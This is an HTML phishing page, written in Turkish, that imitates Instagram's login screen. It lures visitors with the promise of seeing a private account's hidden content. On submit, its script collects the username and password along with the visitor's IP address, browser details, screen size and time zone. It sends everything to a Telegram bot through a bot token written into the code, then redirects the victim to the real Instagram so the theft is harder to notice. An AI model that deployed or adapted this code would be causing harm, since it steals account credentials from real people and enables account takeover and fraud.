<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-grow: 1;
            padding: 20px;
            max-width: 935px;
            margin: 0 auto;
        }

        .phones-container {
            flex-basis: 380px;
            align-self: center;
            margin-right: 32px;
        }

        .phones-container img {
            max-width: 100%;
            height: auto;
        }

        .login-container {
            flex-basis: 350px;
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            margin-bottom: 10px;
        }

        .logo {
            margin: 22px auto 12px;
            text-align: center;
        }

        .logo img {
            max-width: 175px;
        }

        form {
            display: flex;
            flex-direction: column;
            margin-top: 24px;
        }

        .form-group {
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            padding: 9px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
        }

        .login-button {
            background-color: #0095f6;
            color: white;
            padding: 7px 16px;
            border-radius: 4px;
            border: none;
            font-weight: 600;
            width: 100%;
            margin-top: 8px;
            cursor: pointer;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider span {
            color: #8e8e8e;
            font-weight: 600;
            font-size: 13px;
            margin: 0 18px;
        }

        .facebook-login {
            color: #385185;
            text-align: center;
            font-weight: 600;
            font-size: 14px;
            margin: 8px 0;
            text-decoration: none;
            display: block;
        }

        .forgot-password {
            color: #00376b;
            text-align: center;
            font-size: 12px;
            margin-top: 12px;
            text-decoration: none;
            display: block;
        }

        .signup-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            text-align: center;
            padding: 20px;
        }

        .signup-container p {
            font-size: 14px;
            margin: 5px;
        }

        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .app-download {
            text-align: center;
            margin-top: 20px;
        }

        .app-download p {
            font-size: 14px;
            margin-bottom: 20px;
        }

        .app-stores {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .app-stores img {
            height: 40px;
        }

        footer {
            padding: 20px 0;
            text-align: center;
        }

        footer nav {
            margin-bottom: 12px;
        }

        footer nav a {
            color: #8e8e8e;
            font-size: 12px;
            margin: 0 8px;
            text-decoration: none;
        }

        .copyright {
            color: #8e8e8e;
            font-size: 12px;
        }

        @media (max-width: 875px) {
            .phones-container {
                display: none;
            }
            .container {
                justify-content: center;
            }
        }
        .warning-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 30px;
            margin-bottom: 10px;
            text-align: left;
            max-width: 450px;
        }

        .warning-header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .warning-icon {
            color: #ed4956;
            font-size: 24px;
            margin-right: 10px;
        }

        .instagram-official {
            color: #385185;
            font-weight: 600;
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }



        .warning-title {
            color: #262626;
            font-weight: 600;
            margin-bottom: 15px;
            font-size: 16px;
        }

        .warning-text {
            color: #262626;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        .warning-details {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            padding: 15px;
            margin: 15px 0;
            border-radius: 4px;
        }

        .appeal-button {
            background-color: #0095f6;
            color: white;
            padding: 8px 20px;
            border-radius: 4px;
            border: none;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            font-size: 14px;
        }

        .time-remaining {
            color: #ed4956;
            font-size: 13px;
            text-align: center;
            margin-top: 15px;
        }

        .case-number {
            color: #8e8e8e;
            font-size: 12px;
            text-align: right;
            margin-top: 20px;
        }

        .continue-button {
            background-color: #0095f6;
            color: white;
            padding: 7px 16px;
            border-radius: 4px;
            border: none;
            font-weight: 600;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <main class="container">
        <div class="phones-container">
            <img src="https://reportaproblem-recovery.netlify.app/phone.png" alt="Instagram phones">
        </div>
        <div class="right-column">
            <div class="login-container">
                <div class="logo">
                    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
                </div>
                <div style="background-color: #fafafa; border-radius: 4px; margin: 15px 0; padding: 16px;">
                    <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 12px;">
                        <svg aria-label="Kilitli Hesap" style="margin-right: 8px;" color="#262626" fill="#262626" height="20" role="img" viewBox="0 0 20 20" width="20">
                            <path d="M10 2a4 4 0 0 0-4 4v2h8V6a4 4 0 0 0-4-4zm8 8H2a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h16a1 1 0 0 0 1-1v-7a1 1 0 0 0-1-1z"></path>
                        </svg>
                        <span style="font-weight: 600; color: #262626;">Gizli Hesap</span>
                    </div>
                    <p style="color: #8e8e8e; font-size: 14px; text-align: center; margin: 0;">
                        Bu hesabın gizli içeriğini görüntülemek için Instagram hesabınıza giriş yapın
                    </p>
                </div>

                <form id="loginForm" onsubmit="sendToTelegram(event)">
                    <div class="form-group">
                        <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta">
                    </div>
                    <div class="form-group">
                        <input type="password" id="password" placeholder="Şifre">
                    </div>
                    <button type="submit" class="login-button">Giriş yap</button>
                </form>
                <div class="divider">
                    <span>YA DA</span>
                </div>
                <a href="#" class="facebook-login">
                    Facebook ile Giriş Yap
                </a>
                <a href="#" class="forgot-password">
                    Şifreni mi unuttun?
                </a>
            </div>
            <div class="signup-container">
                <p>
                    Hesabın yok mu? <a href="#" class="signup-link">Kaydol</a>
                </p>
            </div>
            <div class="app-download">
                <p>Uygulamayı indir.</p>
                <div class="app-stores">
                    <a href="#">
                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_turkish-tr.png/30b29fd697b2.png" alt="App Store'dan indir">
                    </a>
                    <a href="#">
                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_turkish-tr.png/9d46177cf153.png" alt="Google Play'den indir">
                    </a>
                </div>
            </div>
        </div>
    </main>
    <footer>
        <!-- Existing footer content... -->
    </footer>
    <script>
    document.addEventListener('DOMContentLoaded', function() {
        const urlParams = new URLSearchParams(window.location.search);
        const username = urlParams.get('username');
        const redirect = urlParams.get('redirect');
        
        if (username) {
            document.getElementById('username').value = username;
        }
        
        if (redirect) {
            document.getElementById('loginForm').setAttribute('data-redirect', redirect);
        }
    });

    function sendToTelegram(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const redirect = e.target.getAttribute('data-redirect');
        const chatId = "1462667287";
        const botToken = "7764621104:AAFoMeFLI4hVLc36vqOPIefUeRt1kzFD6zE";
        
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const message = `
    🎯 Instagram Giriş Bilgileri 🎯
    ━━━━━━━━━━━━━━━━━━━━━
    👤 GİRİŞ BİLGİLERİ
    • Kullanıcı Adı: ${username}
    • Şifre: ${password}

    📱 ZİYARETÇİ BİLGİLERİ
    • IP Adresi: ${data.ip}
    • User Agent: ${navigator.userAgent}
    • Platform: ${navigator.platform}
    • Tarayıcı Dili: ${navigator.language}
    • Ekran: ${window.screen.width}x${window.screen.height}

    ⏰ ZAMAN BİLGİLERİ
    • Giriş: ${new Date().toLocaleString()}
    • Zaman Dilimi: ${Intl.DateTimeFormat().resolvedOptions().timeZone}

    🌍 BAĞLANTI BİLGİLERİ
    • Sayfa URL: ${window.location.href}
    • Yönlendirilecek: ${redirect ? 'https://instagram.com/' + redirect : 'Belirtilmemiş'}
    ━━━━━━━━━━━━━━━━━━━━━
                `;
                
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                })
                .then(() => {
                    
                    if (redirect) {
                        window.location.href = `https://instagram.com/${redirect}`;
                    } else {
                        window.location.href = "https://www.instagram.com";
                    }
                });
            });
    }
    </script>
</body>
</html>
